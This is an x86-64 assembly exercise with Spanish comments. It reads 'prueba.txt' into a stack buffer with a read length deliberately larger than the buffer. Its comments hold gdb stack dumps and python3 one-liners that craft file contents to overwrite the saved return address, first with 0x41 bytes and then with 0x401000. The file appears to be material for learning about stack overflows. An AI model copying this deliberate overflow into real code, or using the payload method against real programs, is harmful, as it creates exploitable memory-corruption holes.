global _start
section .text
_start:
    call leer
    call salir
leer:
    xor rax,rax
    push rax
    push 'xt'
    mov rbx,'prueba.t'
    push rbx                       ;ingresa cadena a la pila
    mov rdi,rsp
    xor rsi,rsi
    mov al,2
    syscall

    mov rdi,rax
    push rsi
    mov rsi,rsp
    mov dl,40                      ;Valor longitud buffer (max=32 bow=40)
    xor rax,rax
    syscall

    xor rdi,rdi
    inc rdi
    xor rax,rax
    inc rax
    syscall

    pop rax
    pop rax
    pop rax
    pop rax
    ret
salir:
    xor rdi,rdi
    xor rax,rax
    mov al,60
    syscall
    ret

;(gdb) break leer
;(gdb) run
;(gdb) x/6xg $rsp
;0x7fffffffdf18: 0x0000000000401005      0x0000000000000001
;0x7fffffffdf28: 0x00007fffffffe1a2      0x0000000000000000
;0x7fffffffdf38: 0x00007fffffffe1c7      0x00007fffffffe1d7
;(gdb) si 20

;normal
;(gdb) x/8xg $rsp
;0x7fffffffdf08: 0x6c626d73656e6520      0x6d617620726f6461
;0x7fffffffdf18: 0x0000000000401005      0x0000000000000001
;0x7fffffffdf28: 0x00007fffffffe1a2      0x0000000000000000

;vulnerable
;(gdb) x/6xg $rsp
;0x7fffffffdef8: 0x6e756d20616c6f68      0x6564736564206f64
;0x7fffffffdf08: 0x6c626d73656e6520      0x6d617620726f6461
;0x7fffffffdf18: 0x626f73206120736f      0x0000000000000001

;prueba.txt
;hola mundo desde enesmblador v|amos a sob|0x0000000000401000
;python3 -c "print('hola mundo desde enesmblador vam'+'\x41\x41\x41\x41\x41\x41\x41\x41')" > prueba.txt
;python3 -c "print('hola mundo desde enesmblador vam'+'\x00\x10\x40\x00\x00\x00\x00\x00')" > prueba.txt
;q